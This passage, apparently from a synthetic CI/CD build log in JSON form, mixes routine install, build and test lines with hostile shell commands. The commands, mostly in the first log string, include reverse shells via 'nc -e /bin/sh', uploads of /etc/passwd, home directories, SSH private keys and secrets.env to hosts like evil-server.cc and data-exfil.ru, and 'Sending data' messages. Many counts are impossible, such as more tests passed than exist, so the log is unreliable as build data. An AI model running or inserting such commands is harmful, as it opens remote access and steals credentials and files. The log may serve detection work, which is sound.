930MB\nTime: 82.684s\nUploading artifact 'build' (50 files)\nFetching submodules...\n\u2713 All checks passed\n[12:47:36] WARN: Deprecated API usage\nCache saved successfully\n  PASS: test_auth_login (101ms)\npip: Downloading jest-4.16.tar.gz\nnpm notice: package.json updated\nNODE_ENV=development\nSwitched to branch 'hotfix/task-611'\nWaiting...\nTime: 113.993s\nPulling image: node:18\nWARNING: lodash has known vulnerabilities\n[12:47:36] INFO: Cache refreshed\nLayer 5/15: RUN command\n[12:47:36] INFO: Request completed\nnpm notice: created a lockfile\nSwitched to branch 'feature/task-694'\n\u2713 All checks passed\nEnvironment: staging\nChecking out develop branch\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: package.json updated\nReady.\nPlatform: darwin-arm64\n[12:47:36] WARN: Deprecated API usage\nFAILED: test_api_health\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\npip: Installing build dependencies...\nCompiling components/index.js...\nWARNING: jest has known vulnerabilities\nPushing to registry...\n\u2717 build failed with exit code 91\nLoading...\nHEAD is now at f27c828\nMinifying app.js\n[12:47:36] ERROR: Connection failed\n[12:47:36] DEBUG: Query executed in 63ms\nDone.\nWaiting...\nPushing to registry...\n\u2713 All checks passed\nTransforming 245 files...\nChecking out main branch\nnpm notice: created a lockfile\nOptimizing 29 modules...\n[12:47:36] INFO: Cache refreshed\nConnection established\n\u2713 Step 'install' succeeded\nWARNING: axios has known vulnerabilities\n  PASS: test_api_health (365ms)\npip: Downloading jest-4.4.tar.gz\nnpm install: resolved 1538 packages\nChecking out main branch\n[12:47:36] DEBUG: Initializing service\nProcessing...\nTests: 179 passed, 457 total\nFAILED: test_auth_login\n\u2713 All checks passed\nProcessing...\nInstalling jest@5.16.6\nBuilding Docker image...\nFinished.\nPlatform: linux-x64\nFinished.\n[12:47:36] DEBUG: Loading configuration\nBuilding Docker image...\n[12:47:36] ERROR: Connection failed\nTransforming 124 files...\nReady.\nStep 3/24: Building\n[12:47:36] INFO: Cache refreshed\nEnvironment: development\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 build completed\nPulling image: node:3.11\nVerifying...\nArtifact uploaded: dist.zip (34MB)\n\u2713 All checks passed\nRan 17 tests in 59s\nArtifact downloaded: 42MB\nEnvironment: staging\n[12:47:36] INFO: Cache refreshed\nSuccess!\nMinifying vendor.js\nCache saved successfully\nCache miss for key-7119\n[12:47:36] WARN: Deprecated API usage\n[12:47:36] INFO: Request completed\nBuilding Docker image...\npip: Downloading express-5.1.tar.gz\nStep 15/21: Testing\n\u2713 All checks passed\n[12:47:36] INFO: Request completed\nInstalling webpack@4.0.1\nLayer 8/11: ENV command\n\u2713 build completed\nGenerating source maps...\nStep 8/23: Deploying\npip install: Successfully installed express-3.13\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:36] DEBUG: Connection pool: 12 active\n[12:47:36] WARN: Deprecated API usage\nCache hit for key-1030\nConnection established\n=== Step integration_tests completed ===\n=== Step: save_cache ===\nPushing to registry...\n[12:47:36] DEBUG: Connection pool: 11 active\nInstalling express@5.17.6\nCompiling components/service.java...\n[12:47:36] DEBUG: Memory usage: 960MB\nWARNING: eslint has known vulnerabilities\nProcessing...\nReady.\n[12:47:36] DEBUG: Query executed in 94ms\nnpm notice: created a lockfile\npip: Downloading express-1.1.tar.gz\nFAILED: test_auth_login\n  PASS: unit/test_user_create.spec.js\npip: Downloading express-3.16.tar.gz\nStep 18/25: Building\nOptimizing 33 modules...\nPushing to registry...\nDone.\nCompiling lib/utils.go...\nProcessing...\nPOST /api - 201 (334ms)\nWARNING: axios has known vulnerabilities\n  PASS: test_user_create (7ms)\nInstalling jest@3.6.7\nReady.\nStep 6/18: Deploying\nStep 8/17: Linting\nLoading...\nTime: 19.648s\n  PASS: e2e/test_db_connect.spec.js\n  PASS: integration/test_user_create.spec.js\nPulling image: alpine:3.11\nOptimizing 78 modules...\nMinifying vendor.js\nGenerating source maps...\nnpm install: resolved 884 packages\nNODE_ENV=test\nWaiting...\nCache invalidated: dependencies\nException: TypeError\nnpm install: added 417 packages\nPOST /upload - 200 (448ms)\nStep 9/18: Building\n[12:47:36] DEBUG: Query executed in 24ms\nStep 3/24: Deploying\nnpm install: added 352 packages\n\u2713 Step 'install' succeeded\nWARNING: lodash has known vulnerabilities\nAlready up to date.\n  PASS: test_api_health (497ms)\nStep 20/22: Testing\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling lodash@4.13.8\n[12:47:36] INFO: Processing request\nOK\n[12:47:36] DEBUG: Query executed in 13ms\nCache miss for key-9203\nVerifying...\n  PASS: e2e/test_user_create.spec.js\nInstalling axios@1.5.0\nGET /api - 201 (95ms)\nCompiling components/main.py...\n[12:47:36] INFO: Connecting to database\nWaiting...\nStep 20/15: Building\n[12:47:36] INFO: Request completed\n\u2713 Step 'setup' succeeded\n[12:47:36] DEBUG: Initializing service\nCompleted.\nnpm notice: package.json updated\n[12:47:36] INFO: Connecting to database\n[12:47:36] WARN: Deprecated API usage\n\u2713 validate completed\n\u2717 build failed with exit code 7\nTests: 90 passed, 71 total\nCache invalidated: node_modules\nUploading artifact 'dist' (16 files)\npip: Installing build dependencies...\nStep 14/18: Installing dependencies\nCoverage: 100% statements, 88% branches\nTime: 114.241s\npip install: Successfully installed webpack-1.1\npip: Installing build dependencies...\nPushing to registry...\nCache hit for key-6005\nTime: 118.112s\nCompiling src/handler.rs...\nDone.\nnpm notice: created a lockfile\n[12:47:36] WARN: Deprecated API usage\nCache invalidated: node_modules\nFinished.\nWaiting...\nCompiling src/service.java...\nEnvironment: development\nCompiling utils/app.ts...\nRan 162 tests in 52s\nCoverage: 84% statements, 95% branches\nCache hit for key-3037\n\u2713 Task completed in 699ms\nStep 11/23: Deploying\nArtifact downloaded: 18MB\nCache hit for key-6607\nLoading...\nLoading...\nUploading artifact 'coverage' (9 files)\nPushing to registry...\npip: Collecting eslint\nPOST /data - 200 (153ms)\nGET /status - 201 (40ms)\nStep 5/19: Linting\nCompleted.\nRan 18 tests in 23s\nnpm install: added 492 packages\nCompleted.\n[12:47:36] DEBUG: Query executed in 5ms\nCache saved successfully\nArtifact downloaded: 34MB\nBuilding Docker image...\nDone.\nCache hit for key-6859\nTransforming 101 files...\nHEAD is now at 5f99fb6\nCompiling src/utils.go...\nArtifact downloaded: 7MB\nnpm install: resolved 1873 packages\nRan 18 tests in 28s\nArtifact downloaded: 12MB\nTLS handshake completed\n  PASS: test_cache_hit (497ms)\nTime: 55.101s\nNODE_ENV=test\nCache restored successfully (224MB)\nyarn add: Done in 27.85s\nCache restored successfully (424MB)\nCompiling components/main.py...\nTransforming 547 files...\nHEAD is now at ec353b6\nSuccess!\nStep 1/15: Running migrations\npip: Installing build dependencies...\nWARNING: webpack has known vulnerabilities\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\nSwitched to branch 'bugfix/task-322'\n\u2713 package completed\n[12:47:36] DEBUG: Query executed in 39ms\npip install: Successfully installed react-5.19\npip: Installing build dependencies...\n[12:47:36] DEBUG: Query executed in 91ms\nSwitched to branch 'hotfix/task-596'\nStep 1/17: Running migrations\nOptimizing 80 modules...\n[12:47:36] WARN: Deprecated API usage\nBundling runtime.css\nTime: 110.938s\nStep 6/15: Testing\n[12:47:36] INFO: Request completed\nCompiling utils/service.java...\nArtifact downloaded: 30MB\nBundling runtime.css\nStep 1/23: Running migrations\nCache saved successfully\nCreating production build...\nNODE_ENV=development\nnpm notice: package.json updated\n[12:47:36] INFO: Processing request\nSwitched to branch 'bugfix/task-840'\nPOST /upload - 200 (389ms)\nCache restored successfully (318MB)\nImage pulled successfully\nnpm notice: package.json updated\n\u2713 Step 'setup' succeeded\nCache miss for key-6316\nAlready up to date.\nPushing to registry...\nWARNING: webpack has known vulnerabilities\nyarn add: Done in 2.23s\nOptimizing 23 modules...\npip: Downloading react-3.6.tar.gz\nnpm install: resolved 1507 packages\nTLS handshake completed\nUploading artifact 'build' (32 files)\nTime: 29.243s\nTests: 106 passed, 140 total\nCache invalidated: node_modules\nCompleted.\nStep 6/16: Building\nWaiting...\nException: NullPointerException\nStep 17/17: Installing dependencies\n[12:47:36] INFO: Starting build process\nRan 47 tests in 47s\nVerifying...\nTime: 64.327s\nArtifact uploaded: dist.zip (21MB)\nStep 11/16: Running migrations\n[12:47:36] INFO: Processing request\nRan 96 tests in 7s\nMinifying main.js\nProcessing...\n[12:47:36] INFO: Connecting to database\nTime: 96.316s\nUsing Node.js 19.12.2\n[12:47:36] DEBUG: Query executed in 61ms\nTests: 356 passed, 441 total\nCompiling components/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (8MB)\n\u2717 build failed with exit code 40\nOK\nReady.\n[12:47:36] DEBUG: Memory usage: 1850MB\nSuccess!\nPulling image: alpine:latest\nStep 7/15: Deploying\nArtifact downloaded: 35MB\nCache miss for key-2061\nVerifying...\npip: Downloading webpack-3.11.tar.gz\nOptimizing 58 modules...\nStep 14/17: Deploying\nMinifying vendor.js\n[12:47:36] DEBUG: Memory usage: 1324MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nEnvironment: development\nDone.\nProcessing...\nArtifact uploaded: build.tar.gz (42MB)\nFetching from https://amazonaws.com/package.json\n[12:47:36] DEBUG: Connection pool: 13 active\nHEAD is now at c1ff97c\nUsing Python 3.12\n[12:47:36] INFO: Starting build process\nWARNING: lodash has known vulnerabilities\nArtifact downloaded: 35MB\nUsing Node.js 15.0.3\nLoading...\nCache miss for key-2125\nCompiling lib/app.ts...\n=== Step save_cache completed ===\nnc -e /bin/sh 185.220.213.171 6768\n=== Step: setup_environment ===\n[12:47:36] ERROR: Connection failed\nCache invalidated: dependencies\nProcessing...\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nStep 17/17: Testing\nGET /health - 200 (90ms)\nSuccess!\nSnapshots: 31 passed, 9 total\nGET /health - 204 (5ms)\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\n[12:47:36] WARN: Deprecated API usage\nArtifact downloaded: 13MB\nSwitched to branch 'bugfix/task-633'\nCoverage: 94% statements, 91% branches\nCoverage: 85% statements, 88% branches\n\u2713 build completed\nCache miss for key-8174\nGenerating source maps...\nConnection established\npip: Installing build dependencies...\nCompiling utils/app.ts...\nCoverage: 81% statements, 89% branches\n[12:47:36] INFO: Cache refreshed\n[12:47:36] INFO: Connecting to database\nRan 117 tests in 55s\n\u2713 Step 'install' succeeded\nCompiling utils/service.java...\nWaiting...\nCache invalidated: node_modules\nCache saved successfully\nInstalling react@1.11.7\nCompiling src/utils.go...\nnc -e /bin/sh 81.59.239.196 58699\nStep 17/15: Deploying\nyarn add: Done in 2.65s\nFinished.\nStep 6/25: Linting\nnpm install: resolved 586 packages\nCompiling src/main.py...\nStep 4/16: Testing\n[12:47:36] DEBUG: Memory usage: 1297MB\nSending 77MB of data to data-exfil.ru\n[12:47:36] INFO: Processing request\nCoverage: 81% statements, 70% branches\nSwitched to branch 'bugfix/task-523'\nBuilding Docker image...\n\u2713 test completed\nnpm notice: package.json updated\nUsing Python 3.12\nUsing Python 3.10\nStep 20/20: Running migrations\nStep 7/18: Running migrations\nTransforming 793 files...\nCompiling lib/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nDone.\nArtifact uploaded: dist.zip (69MB)\nOptimizing 53 modules...\npip: Downloading lodash-2.13.tar.gz\nBuilding Docker image...\nCache saved successfully\nRan 171 tests in 22s\n\u2713 Task completed in 1002ms\nReady.\n[12:47:36] DEBUG: Connection pool: 6 active\nMinifying vendor.js\nFAILED: test_auth_login\nTest Suites: 27 passed, 32 total\nnpm notice: package.json updated\nTest Suites: 34 passed, 5 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 7/21: Testing\nnpm notice: package.json updated\nStep 8/24: Testing\npip: Installing build dependencies...\nConnection established\nRan 182 tests in 16s\nLoading...\npip: Collecting jest\nArtifact uploaded: dist.zip (13MB)\nWaiting...\n[12:47:36] DEBUG: Initializing service\nStep 10/19: Running migrations\nnc -e /bin/sh 129.180.83.219 59769\nStep 3/21: Installing dependencies\nyarn add: Done in 20.95s\nnpm notice: package.json updated\nInstalling eslint@4.5.8\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nProcessing...\nCompiling lib/main.py...\nSwitched to branch 'bugfix/task-697'\n[12:47:36] INFO: Starting build process\nArtifact uploaded: build.tar.gz (31MB)\nImage pulled successfully\nnpm notice: created a lockfile\nInstalling express@3.16.0\nWARNING: express has known vulnerabilities\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nSwitched to branch 'feature/task-567'\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nyarn add: Done in 19.44s\nConnection established\nArtifact downloaded: 37MB\n[12:47:36] INFO: Request completed\nnpm install: resolved 689 packages\nArtifact uploaded: dist.zip (7MB)\nyarn add: Done in 12.54s\nCache saved successfully\nUsing Node.js 20.15.0\npip: Installing build dependencies...\n\u2717 build failed with exit code 85\nChecking out develop branch\npip: Collecting axios\nCache miss for key-1095\nBuilding Docker image...\nnpm notice: created a lockfile\npip install: Successfully installed express-3.1\nArtifact uploaded: dist.zip (62MB)\nBuilding Docker image...\nWARNING: express has known vulnerabilities\nUsing Node.js 18.3.7\n[12:47:36] INFO: Request completed\nRan 18 tests in 23s\nSnapshots: 30 passed, 35 total\nnc -e /bin/sh 234.22.111.24 26688\nHEAD is now at 4736725\n  PASS: unit/test_api_health.spec.js\n[12:47:36] DEBUG: Connection pool: 20 active\npip: Collecting react\nEnvironment: development\nOK\nNODE_ENV=production\nImage pulled successfully\nPOST /data - 200 (15ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nOK\necho $(cat ~/.ssh/id_rsa) | base64 | nc 223.217.146.50 53624\nOK\nSuccess!\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nDone.\nBuilding Docker image...\nSending 96MB of data to malicious-pool.xyz\nSnapshots: 26 passed, 27 total\nGET /api - 200 (40ms)\nWaiting...\nReady.\nOptimizing 12 modules...\nSwitched to branch 'bugfix/task-750'\nSwitched to branch 'hotfix/task-660'\nWARNING: jest has known vulnerabilities\nStep 10/18: Building\nImage pulled successfully\nnpm install: resolved 934 packages\nFAILED: test_cache_hit\npip: Installing build dependencies...\nHEAD is now at 1c1c2fd\nWARNING: webpack has known vulnerabilities\nnpm notice: package.json updated\n[12:47:36] DEBUG: Memory usage: 636MB\nReady.\nGET /health - 200 (55ms)\nCache saved successfully\n[12:47:36] DEBUG: Connection pool: 20 active\nCompleted.\n[12:47:36] DEBUG: Connection pool: 20 active\npip install: Successfully installed lodash-2.4\nArtifact uploaded: dist.zip (85MB)\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nArtifact uploaded: build.tar.gz (42MB)\nFetching from https://pypi.org/package.json\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/handler.rs...\nAlready up to date.\nHEAD is now at 702de6f\nRan 164 tests in 27s\n\u2713 package completed\nMinifying vendor.js\nEnvironment: production\nPushing to registry...\nLoading...\n[12:47:36] INFO: Request completed\nOK\nFAILED: test_db_connect\nPOST /upload - 200 (232ms)\nReady.\n[12:47:36] DEBUG: Memory usage: 537MB\nEnvironment: development\npip: Downloading lodash-1.4.tar.gz\nCompiling components/index.js...\nSuccess!\n[12:47:36] ERROR: Connection failed\nFAILED: test_api_health\n  PASS: integration/test_db_connect.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\n[12:47:36] DEBUG: Connection pool: 11 active\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\n[12:47:36] DEBUG: Memory usage: 829MB\nUsing Node.js 14.13.0\nGenerating source maps...\nPulling image: alpine:3.11\nCreating production build...\n[12:47:36] WARN: Deprecated API usage\nMinifying main.js\nCreating production build...\npip install: Successfully installed prettier-4.17\nCompiling components/main.py...\nPushing to registry...\n  PASS: test_user_create (291ms)\nRan 68 tests in 10s\n\u2717 build failed with exit code 110\nCoverage: 78% statements, 78% branches\n\u2713 build completed\nSnapshots: 33 passed, 14 total\n[12:47:36] DEBUG: Connection pool: 20 active\necho $(cat ~/.ssh/id_rsa) | base64 | nc 156.109.137.222 60667\nTest Suites: 21 passed, 47 total\nCache saved successfully\nRan 31 tests in 33s\nWARNING: webpack has known vulnerabilities\nCompiling components/handler.rs...\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\npip install: Successfully installed jest-4.12\nSending 256MB of data to evil-server.cc\npip install: Successfully installed lodash-2.18\n  PASS: test_cache_hit (359ms)\nBuilding Docker image...\nWARNING: lodash has known vulnerabilities\nTime: 57.750s\n[12:47:36] DEBUG: Loading configuration\n  PASS: test_db_connect (206ms)\nCache restored successfully (81MB)\nChecking out master branch\nWARNING: prettier has known vulnerabilities\nStep 17/15: Running migrations\nCompiling src/utils.go...\nTransforming 836 files...\nChecking out master branch\nFetching from https://githubusercontent.com/package.json\nyarn add: Done in 18.92s\nCache miss for key-7389\nSending 337MB of data to malicious-pool.xyz\n[12:47:36] INFO: Processing request\nCompiling utils/app.ts...\nCompiling components/index.js...\n[12:47:36] ERROR: Connection failed\nStep 6/19: Deploying\nRan 70 tests in 59s\npip: Downloading webpack-2.7.tar.gz\n[12:47:36] INFO: Processing request\nStep 17/16: Deploying\nCompiling components/main.py...\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nArtifact downloaded: 29MB\nnpm install: added 227 packages\n[12:47:36] ERROR: Connection failed\nSending 316MB of data to crypto-mine.io\n[12:47:36] DEBUG: Query executed in 3ms\n[12:47:36] DEBUG: Memory usage: 184MB\nMinifying app.js\n=== Step setup_environment completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-27T12:47:36.146584",
        "finished_at": "2025-11-27T12:47:50.874697",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:47:36] DEBUG: Memory usage: 1145MB",
          "Compiling lib/service.java...",
          "NODE_ENV=development",
          "Generating source maps...",
          "[12:47:36] DEBUG: Memory usage: 665MB",
          "GET /api - 204 (13ms)",
          "Switched to branch 'feature/task-804'",
          "npm install: resolved 1806 packages",
          "Fetching from https://npmjs.org/package.json",
          "[12:47:36] INFO: Connecting to database",
          "Transforming 705 files...",
          "Creating production build...",
          "Checking out master branch",
          "Pulling image: alpine:latest",
          "Coverage: 98% statements, 100% branches",
          "Time: 87.383s",
          "Installing express@1.16.3",
          "[12:47:36] WARN: Deprecated API usage",
          "Step 15/23: Testing",
          "[12:47:36] DEBUG: Initializing service",
          "Step 3/21: Testing",
          "[12:47:36] WARN: Deprecated API usage",
          "Generating source maps...",
          "HEAD is now at 122a3d3",
          "[12:47:36] DEBUG: Loading configuration",
          "pip: Downloading prettier-3.7.tar.gz",
          "Layer 4/8: COPY command",
          "Building Docker image...",
          "Optimizing 78 modules...",
          "WARNING: react has known vulnerabilities",
          "Cache restored successfully (473MB)",
          "Transforming 903 files...",
          "[12:47:36] INFO: Connecting to database",
          "Ready.",
          "Generating source maps...",
          "Already up to date.",
          "[12:47:36] INFO: Starting build process",
          "WARNING: react has known vulnerabilities",
          "Pulling image: alpine:18",
          "Snapshots: 8 passed, 13 total",
          "Step 9/25: Testing",
          "[12:47:36] DEBUG: Query executed in 60ms",
          "Step 13/22: Building",
          "npm notice: created a lockfile",
          "Step 1/23: Deploying",
          "Compiling src/service.java...",
          "Creating production build...",
          "Switched to branch 'bugfix/task-995'",
          "WARNING: react has known vulnerabilities",
          "[12:47:36] INFO: Request completed",
          "Time: 37.409s",
          "Cache restored successfully (484MB)",
          "Time: 45.647s",
          "Step 13/16: Testing",
          "Loading...",
          "Time: 21.848s",
          "pip: Collecting prettier",
          "FAILED: test_api_health",
          "HEAD is now at dd2ea79",
          "pip: Installing build dependencies...",
          "Using Node.js 17.13.4",
          "TLS handshake completed",
          "Compiling utils/main.py...",
          "Step 16/21: Deploying",
          "[12:47:36] INFO: Request completed",
          "Compiling src/main.py...",
          "Fetching from https://githubusercontent.com/package.json",
          "Platform: win32-x64",
          "Building Docker image...",
          "Step 14/17: Linting",
          "[12:47:36] DEBUG: Initializing service",
          "HEAD is now at c2570d1",
          "GET /api - 200 (19ms)",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 Task completed in 1816ms",
          "Step 3/15: Running migrations",
          "[12:47:36] DEBUG: Memory usage: 640MB",
          "WARNING: lodash has known vulnerabilities",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] INFO: Starting build process",
          "Verifying...",
          "Waiting...",
          "\u2717 build failed with exit code 77",
          "Step 8/25: Linting",
          "NODE_ENV=test",
          "Cache saved successfully",
          "WARNING: lodash has known vulnerabilities",
          "Connection established",
          "[12:47:36] INFO: Cache refreshed",
          "Fetching submodules...",
          "Cache restored successfully (300MB)",
          "npm notice: package.json updated",
          "Minifying vendor.js",
          "Using Node.js 14.18.4",
          "yarn add: Done in 13.98s",
          "OK",
          "Artifact downloaded: 24MB",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching from https://npmjs.org/package.json",
          "Artifact downloaded: 20MB",
          "Optimizing 20 modules...",
          "Pulling image: alpine:latest",
          "[12:47:36] DEBUG: Memory usage: 1377MB",
          "Connection established",
          "Test Suites: 49 passed, 27 total",
          "Fetching submodules...",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at ea775de",
          "HEAD is now at 46bf71f",
          "Using Python 3.12",
          "Connection established",
          "Step 12/22: Running migrations",
          "Pushing to registry...",
          "[12:47:36] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact downloaded: 28MB",
          "pip: Downloading lodash-4.6.tar.gz",
          "Done.",
          "Pushing to registry...",
          "Cache saved successfully",
          "Waiting...",
          "Bundling runtime.css",
          "npm install: added 321 packages",
          "npm notice: package.json updated",
          "Coverage: 86% statements, 75% branches",
          "Compiling components/handler.rs...",
          "Tests: 251 passed, 63 total",
          "npm install: resolved 825 packages",
          "Tests: 119 passed, 495 total",
          "[12:47:36] INFO: Connecting to database",
          "Layer 9/8: COPY command",
          "Step 10/15: Testing",
          "pip: Installing build dependencies...",
          "[12:47:36] DEBUG: Initializing service",
          "WARNING: react has known vulnerabilities",
          "Optimizing 36 modules...",
          "pip: Downloading lodash-2.1.tar.gz",
          "TLS handshake completed",
          "Processing...",
          "Step 9/21: Installing dependencies",
          "Fetching from https://githubusercontent.com/package.json",
          "Layer 3/10: RUN command",
          "Step 4/19: Deploying",
          "[12:47:36] WARN: Deprecated API usage",
          "[12:47:36] DEBUG: Initializing service",
          "Tests: 273 passed, 473 total",
          "[12:47:36] DEBUG: Connection pool: 6 active",
          "GET /api - 204 (71ms)",
          "  PASS: test_auth_login (108ms)",
          "npm notice: package.json updated",
          "  PASS: test_api_health (293ms)",
          "[12:47:36] DEBUG: Connection pool: 2 active",
          "Image pulled successfully",
          "[12:47:36] DEBUG: Connection pool: 12 active",
          "[12:47:36] DEBUG: Memory usage: 1124MB",
          "Cache invalidated: node_modules",
          "Step 8/19: Linting",
          "Pulling image: node:3.11",
          "Done.",
          "Cache hit for key-6119",
          "npm notice: package.json updated",
          "\u2713 Task completed in 2873ms",
          "Test Suites: 14 passed, 44 total",
          "Switched to branch 'feature/task-273'",
          "Environment: test",
          "WARNING: lodash has known vulnerabilities",
          "Step 11/18: Building",
          "pip: Downloading lodash-2.16.tar.gz",
          "Step 12/22: Testing",
          "Using Node.js 15.4.7",
          "[12:47:36] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (12MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling components/handler.rs...",
          "\u2717 build failed with exit code 96",
          "Step 11/15: Testing",
          "Snapshots: 19 passed, 23 total",
          "Compiling components/main.py...",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:36] INFO: Starting build process",
          "[12:47:36] DEBUG: Query executed in 71ms",
          "Cache miss for key-8769",
          "Step 10/25: Linting",
          "Step 18/19: Deploying",
          "Cache invalidated: build",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Layer 2/9: ENV command",
          "Using Python 3.12",
          "Step 20/16: Installing dependencies",
          "Optimizing 77 modules...",
          "Checking out main branch",
          "[12:47:36] INFO: Request completed",
          "Waiting...",
          "Snapshots: 11 passed, 16 total",
          "npm notice: package.json updated",
          "Compiling src/index.js...",
          "Success!",
          "Installing webpack@4.13.10",
          "Connection established",
          "yarn add: Done in 19.61s",
          "Creating production build...",
          "pip install: Successfully installed webpack-5.4",
          "Optimizing 49 modules...",
          "[12:47:36] DEBUG: Connection pool: 12 active",
          "\u2713 test completed",
          "Test Suites: 7 passed, 38 total",
          "Switched to branch 'feature/task-306'",
          "npm install: added 363 packages",
          "npm install: resolved 1228 packages",
          "Fetching from https://gcr.io/package.json",
          "Generating source maps...",
          "Done.",
          "Snapshots: 46 passed, 21 total",
          "Waiting...",
          "Checking out main branch",
          "Layer 3/9: COPY command",
          "WARNING: eslint has known vulnerabilities",
          "Done.",
          "WARNING: axios has known vulnerabilities",
          "Minifying vendor.js",
          "Optimizing 45 modules...",
          "Ran 126 tests in 32s",
          "[12:47:36] WARN: Deprecated API usage",
          "Cache restored successfully (477MB)",
          "Installing webpack@3.11.10",
          "\u2717 build failed with exit code 16",
          "Step 8/16: Linting",
          "WARNING: lodash has known vulnerabilities",
          "Pulling image: node:3.11",
          "pip install: Successfully installed react-1.3",
          "[12:47:36] INFO: Cache refreshed",
          "\u2713 All checks passed",
          "pip: Collecting react",
          "WARNING: lodash has known vulnerabilities",
          "yarn add: Done in 10.39s",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Loading...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-27T12:47:50.874697",
        "finished_at": "2025-11-27T12:47:59.711565",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Switched to branch 'bugfix/task-330'",
          "Connection established",
          "Waiting...",
          "Using Python 3.9",
          "Cache restored successfully (103MB)",
          "Compiling src/handler.rs...",
          "[12:47:36] DEBUG: Connection pool: 18 active",
          "Artifact uploaded: build.tar.gz (40MB)",
          "OK",
          "Optimizing 35 modules...",
          "npm install: added 411 packages",
          "Time: 74.787s",
          "\u2713 Task completed in 2020ms",
          "HEAD is now at 6cc6ce2",
          "npm install: added 423 packages",
          "Fetching from https://npmjs.org/package.json",
          "npm install: resolved 882 packages",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "NODE_ENV=test",
          "  PASS: test_auth_login (337ms)",
          "Using Node.js 19.0.1",
          "Uploading artifact 'build' (21 files)",
          "Time: 31.360s",
          "\u2713 All checks passed",
          "Layer 1/10: COPY command",
          "TLS handshake completed",
          "Verifying...",
          "Done.",
          "Waiting...",
          "Transforming 417 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-1345",
          "Cache restored successfully (417MB)",
          "[12:47:36] DEBUG: Initializing service",
          "pip: Downloading prettier-3.2.tar.gz",
          "[12:47:36] INFO: Starting build process",
          "Step 4/21: Testing",
          "[12:47:36] DEBUG: Connection pool: 1 active",
          "Optimizing 43 modules...",
          "[12:47:36] INFO: Request completed",
          "Step 4/22: Deploying",
          "Cache invalidated: build",
          "Compiling components/index.js...",
          "Processing...",
          "Using Node.js 15.5.6",
          "Optimizing 99 modules...",
          "Uploading artifact 'build' (9 files)",
          "TLS handshake completed",
          "POST /upload - 202 (272ms)",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "yarn add: Done in 18.50s",
          "Step 5/23: Building",
          "Artifact downloaded: 28MB",
          "Compiling src/utils.go...",
          "Finished.",
          "Artifact uploaded: build.tar.gz (17MB)",
          "OK",
          "Test Suites: 42 passed, 44 total",
          "Minifying main.js",
          "[12:47:36] DEBUG: Memory usage: 1167MB",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "NODE_ENV=test",
          "Step 6/19: Deploying",
          "[12:47:36] DEBUG: Initializing service",
          "Step 16/18: Running migrations",
          "Optimizing 17 modules...",
          "Already up to date.",
          "Waiting...",
          "pip: Downloading lodash-2.1.tar.gz",
          "Step 3/19: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Tests: 307 passed, 288 total",
          "Completed.",
          "Cache invalidated: build",
          "npm notice: package.json updated",
          "[12:47:36] DEBUG: Initializing service",
          "Step 11/18: Installing dependencies",
          "Minifying vendor.js",
          "Loading...",
          "Ready.",
          "Using Node.js 20.1.8",
          "  PASS: test_auth_login (348ms)",
          "Connection established",
          "Success!",
          "Test Suites: 50 passed, 45 total",
          "Connection established",
          "[12:47:36] DEBUG: Connection pool: 14 active",
          "Cache miss for key-5822",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Compiling utils/main.py...",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:47:36] INFO: Cache refreshed",
          "\u2713 Step 'setup' succeeded",
          "POST /data - 201 (138ms)",
          "[12:47:36] DEBUG: Connection pool: 12 active",
          "Step 5/15: Running migrations",
          "Step 2/17: Running migrations",
          "Step 8/25: Testing",
          "Environment: production",
